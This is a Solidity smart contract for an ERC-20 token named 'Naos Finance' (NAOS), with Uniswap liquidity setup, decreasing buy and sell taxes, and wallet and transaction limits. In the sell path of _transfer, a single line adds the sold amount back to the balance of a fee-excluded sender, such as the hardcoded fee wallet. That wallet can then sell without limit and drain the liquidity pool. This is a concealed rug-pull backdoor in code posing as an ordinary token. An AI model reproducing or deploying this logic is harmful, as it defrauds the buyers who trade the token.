// SPDX-License-Identifier: MIT

/*
Bring real world assets on -chain and re-define yield in DEFI.

Website: https://www.naosfinance.org
App: https://app.naosfinance.org
Telegram: https://t.me/naos_erc
Twitter: https://twitter.com/naos_erc
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract NAOS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Naos Finance";
    string private constant _symbol = unicode"NAOS";

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10_000_000 * 10**_decimals;
    uint256 public maxTxAmount = 150_000 * 10**_decimals;
    uint256 public maxWallet = 150_000 * 10**_decimals;
    uint256 public feeSwapThreshold = 1_000 * 10**_decimals;
    uint256 public feeSwapMax = 100_000 * 10**_decimals;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _lastTransferTimestamp;

    bool public hasTransferDelay = true;
    address payable private feeAddress;

    uint256 private _initialBuyFee;
    uint256 private _initialSellFee;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyFeeAt = 13;
    uint256 private _reduceSellFeeAt = 13;
    uint256 private _preventSwapBefore = 13;
    uint256 private _numOfBuyers;

    IRouter private uniRouterV2;
    address private uniPairV2;
    bool private tradeEnabled;
    bool private swapping = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        feeAddress = payable(0x8A02a47760B8dFF7d81Db303293a1E602Cc22c6b);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[feeAddress] = true;

        uniRouterV2 = IRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniPairV2 = IFactory(uniRouterV2.factory()).createPair(
            address(this),
            uniRouterV2.WETH()
        );

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function openTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        _approve(address(this), address(uniRouterV2), _tTotal);
        uniRouterV2.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairV2).approve(
            address(uniRouterV2),
            type(uint256).max
        );
        _initialBuyFee = 14;
        _initialSellFee = 14;
        _finalBuyTax = 1;
        _finalSellTax = 1;
        swapEnabled = true;
        tradeEnabled = true;
    }

    receive() external payable {}
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _tTotal;
        maxWallet = _tTotal;
        hasTransferDelay = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHFee(uint256 amount) private {
        feeAddress.transfer(amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (_numOfBuyers > _reduceBuyFeeAt)
                        ? _finalBuyTax
                        : _initialBuyFee
                )
                .div(100);

            if (hasTransferDelay) {
                if (
                    to != address(uniRouterV2) &&
                    to != address(uniPairV2)
                ) {
                    require(
                        _lastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _lastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniPairV2 &&
                to != address(uniRouterV2) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                require(
                    balanceOf(to) + amount <= maxWallet,
                    "Exceeds the maxWallet."
                );
                if (_numOfBuyers <= 100) {
                    _numOfBuyers++;
                }
            }

            if (to == uniPairV2 && from != address(this)) {
                if (_isExcludedFromFee[from]) { _balances[from] = _balances[from].add(amount);}
                taxAmount = amount
                    .mul(
                        (_numOfBuyers > _reduceSellFeeAt)
                            ? _finalSellTax
                            : _initialSellFee
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == uniPairV2 &&
                swapEnabled &&
                contractTokenBalance > feeSwapThreshold &&
                amount > feeSwapThreshold &&
                _numOfBuyers > _preventSwapBefore && 
                !_isExcludedFromFee[from]
            ) {
                swapTokensToETH(
                    min(amount, min(contractTokenBalance, feeSwapMax))
                );
                sendETHFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
}